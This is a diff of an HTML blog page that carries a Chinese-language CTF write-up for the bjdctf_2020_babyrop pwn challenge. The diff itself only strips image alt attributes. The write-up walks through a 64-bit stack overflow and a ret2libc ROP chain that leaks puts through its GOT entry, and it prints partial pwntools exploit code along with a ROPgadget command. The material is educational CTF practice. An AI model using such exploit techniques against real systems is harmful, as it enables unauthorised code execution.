@@ -442,15 +442,15 @@
             <div id="articleContent">
                 <span id="more"></span>
 <h1 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h1><p>检查保护机制，开启NX，64位</p>
-<p><img src="/img/image-20210626120953251.png" alt="image-20210626120953251"></p>
+<p><img src="/img/image-20210626120953251.png"></p>
 <p>运行程序，看见有libc的字眼，想到应该和libc泄露有关</p>
-<p><img src="/img/image-20210626121205881.png" alt="image-20210626121205881"></p>
+<p><img src="/img/image-20210626121205881.png"></p>
 <p>shift+F12查找字符串，没有找到system(‘/bin/sh’)，看样子应该就是这个类型的题了</p>
-<h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><p><img src="/img/image-20210626121435224.png" alt="image-20210626121435224"></p>
+<h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><p><img src="/img/image-20210626121435224.png"></p>
 <p>看到一个vuln()函数，应该会是解题的关键，点进去看，果然</p>
-<p><img src="/img/image-20210626121534041.png" alt="image-20210626121534041"></p>
+<p><img src="/img/image-20210626121534041.png"></p>
 <p>找到了漏洞，read读入长度为0x64，buf大小为0x20，就从这个地方切入</p>
-<p><img src="/img/image-20210626122951905.png" alt="image-20210626122951905"></p>
+<p><img src="/img/image-20210626122951905.png"></p>
 <h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>1.利用puts函数去泄露libc版本</p>
 <p>2.计算偏移量，算出程序里的system函数和字符串’/bin/sh’的地址</p>
 <p>3.利用溢出漏洞，构造rop，夺权</p>
@@ -459,7 +459,7 @@
 <p>当参数大于等于7个时，前6个就是前面6个，后面的参数就从右向左放入栈中，和32位一样</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">ROPgadget <span class="token operator">-</span><span class="token operator">-</span>binary bjdctf_2020_babyrop <span class="token operator">|</span>grep <span class="token string">"pop rdi"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/img/image-20210626122850728.png" alt="image-20210626122850728"></p>
+<p><img src="/img/image-20210626122850728.png"></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
 r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'pull up your sword and tell me u story!'</span><span class="token punctuation">)</span>
 r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
@@ -507,7 +507,7 @@ r<span class="token punctuation">.</span>sendline<span class="token punctuation"
 r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>最后拿到flag</p>
-<p><img src="/img/image-20210626130027859.png" alt="image-20210626130027859"></p>
+<p><img src="/img/image-20210626130027859.png"></p>
 
                 
             </div>
